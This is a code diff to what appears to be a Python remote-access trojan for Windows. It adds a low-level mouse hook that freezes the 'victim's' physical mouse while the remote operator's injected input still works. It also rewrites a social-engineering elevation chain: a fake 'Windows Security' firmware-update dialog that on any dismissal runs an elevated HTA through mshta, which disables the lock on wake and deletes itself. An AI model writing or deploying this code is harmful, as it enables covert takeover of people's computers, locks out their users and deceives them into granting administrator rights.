@@ -853,6 +853,10 @@ _ov_state = {"thread": None, "hwnd": None, "black": False,
              "bits": None, "w": 0, "h": 0}
 _ov_refs = {}
 _pw_refs = {}
+# cursor-pin low-level hook state (see _cursor_block): pump thread, hook
+# handles, keep-alive refs for HOOKPROC trampolines (GC'ing a trampoline
+# => access violation, so they live forever here).
+_cursor_state = {"thread": None, "hooks": [], "cbs": []}
 
 
 def _capture_screen() -> None:
@@ -1079,26 +1083,93 @@ def _overlay_off() -> str:
     return "[+] overlay off (screen live again)"
 
 
-def _cursor_block(hard: bool = False) -> str:
-    """Pin the cursor to a 1x1 rect at its current position (no admin
-    needed). hard=BlockInput additionally (admin only).
-    NOTE: this also pins the netvnc node's remotely-injected cursor -
-    turn the block off (cursor unblock) before active remote control."""
+def _cb_hookproc(nCode, wParam, lParam):
+    # WH_MOUSE_LL: swallow plain WM_MOUSEMOVE (0x0200) only. Injected
+    # input - netvnc remote control (SetCursorPos / mouse_event) - is
+    # flagged LLMHF_INJECTED (0x1, or 0x2 for lower-IL injectors - NOT
+    # 0x10, that is LLKHF_INJECTED for the KEYBOARD hook) and passes
+    # through untouched, so the victim's physical mouse is pinned while
+    # remote control stays live. MSLLHOOKSTRUCT.flags sits at +12 (POINT
+    # 8 bytes + mouseData 4).
+    import ctypes
+    if nCode == 0 and wParam == 0x0200 and lParam:
+        try:
+            flags = ctypes.cast(lParam + 12,
+                                ctypes.POINTER(ctypes.c_uint)).contents.value
+            if not (flags & 0x03):   # LLMHF_INJECTED | LLMHF_LOWER_IL_INJECTED
+                return 1
+        except Exception:
+            pass          # never risk raising inside the hook: pass through
+    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+
+def _cb_hook_start() -> bool:
+    """Install WH_MOUSE_LL on a dedicated message-pump thread (low-level
+    hook callbacks are only delivered while the installing thread pumps
+    messages). Returns True when the hook is live."""
+    import ctypes
+    import ctypes.wintypes as wt
+    u32 = ctypes.windll.user32
+    u32.SetWindowsHookExW.restype = ctypes.c_void_p
+    u32.CallNextHookEx.restype = ctypes.c_ssize_t
+    # default windll conversion is 32-bit: a 64-bit MSLLHOOKSTRUCT pointer
+    # as lParam would raise OverflowError inside every callback otherwise
+    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
+                                   ctypes.c_size_t, ctypes.c_ssize_t)
+    _CB_PROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
+                                  ctypes.c_size_t, ctypes.c_ssize_t)
+    res = {"hook": None, "ev": threading.Event()}
+
+    def run():
+        proc = _CB_PROC(_cb_hookproc)
+        _cursor_state["cbs"].append(proc)  # keep trampoline alive forever
+        hook = u32.SetWindowsHookExW(14, proc, None, 0)  # WH_MOUSE_LL
+        res["hook"] = hook
+        res["ev"].set()
+        if not hook:
+            return
+        msg = wt.MSG()
+        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
+            u32.TranslateMessage(ctypes.byref(msg))
+            u32.DispatchMessageW(ctypes.byref(msg))
+
+    t = threading.Thread(target=run, daemon=True)
+    t.start()
+    res["ev"].wait(timeout=5)
+    if not res["hook"]:
+        return False
+    _cursor_state["hooks"].append(res["hook"])
+    _cursor_state["thread"] = t
+    return True
+
+
+def _cb_hook_stop() -> None:
     import ctypes
     u32 = ctypes.windll.user32
+    t = _cursor_state["thread"]
+    if t is not None and t.is_alive():
+        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)  # WM_QUIT
+        t.join(timeout=5)
+    for hook in _cursor_state["hooks"]:
+        u32.UnhookWindowsHookEx(hook)
+    _cursor_state["hooks"] = []
+    _cursor_state["thread"] = None
 
-    class POINT(ctypes.Structure):
-        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
 
-    class RECT(ctypes.Structure):
-        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
-                    ("r", ctypes.c_long), ("b", ctypes.c_long)]
-
-    pt = POINT()
-    u32.GetCursorPos(ctypes.byref(pt))
-    r = RECT(pt.x, pt.y, pt.x + 1, pt.y + 1)
-    u32.ClipCursor(ctypes.byref(r))
-    msg = "[+] cursor pinned at (%d,%d)" % (pt.x, pt.y)
+def _cursor_block(hard: bool = False) -> str:
+    """Pin the victim's PHYSICAL mouse: a WH_MOUSE_LL hook swallows plain
+    WM_MOUSEMOVE (no admin needed). Injected input - netvnc remote
+    control via SetCursorPos/mouse_event - carries LLMHF_INJECTED and
+    passes through, so remote control stays live while pinned.
+    hard=BlockInput additionally (admin only)."""
+    import ctypes
+    u32 = ctypes.windll.user32
+    t = _cursor_state["thread"]
+    if t is not None and t.is_alive():
+        msg = "[i] cursor already pinned"
+    else:
+        msg = ("[+] cursor pinned (victim moves blocked, remote control live)"
+               if _cb_hook_start() else "[!] cursor hook install failed")
     if hard:
         if u32.BlockInput(1):
             msg += ", hard BlockInput on"
@@ -1110,8 +1181,8 @@ def _cursor_block(hard: bool = False) -> str:
 def _cursor_unblock() -> str:
     import ctypes
     u32 = ctypes.windll.user32
-    u32.ClipCursor(None)
     u32.BlockInput(0)
+    _cb_hook_stop()
     return "[+] cursor released"
 
 
@@ -1668,10 +1739,11 @@ def _power_status() -> str:
 
 
 def request_admin() -> str:
-    """Spoofed-elevation chain (verified): center-screen battery pretext
-    dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
-    process) -> elevated HTA disables sleep console-lock, enables RTC wake,
-    writes a proof flag and self-deletes. On success wake is auto-armed."""
+    """Spoofed-elevation chain (verified): center-screen Windows Security
+    pretext dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not
+    this process) -> elevated HTA disables sleep console-lock, enables RTC
+    wake, writes a proof flag and self-deletes. On success wake is
+    auto-armed."""
     if os.name != "nt":
         return "[!] Windows only"
     import ctypes
@@ -1687,9 +1759,9 @@ def request_admin() -> str:
     # MB_TOPMOST - centered modal, X/Cancel counts as dismissal too
     ctypes.windll.user32.MessageBoxW(
         None,
-        "Your battery is running low (7% remaining).\n\n"
-        "Plug in your PC to keep working.",
-        "Battery Low",
+        "Battery firmware component needs update, Give administrator access "
+        "to update now",
+        "Windows Security",
         0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)
 
     hta = os.path.join(base, "uac.hta")
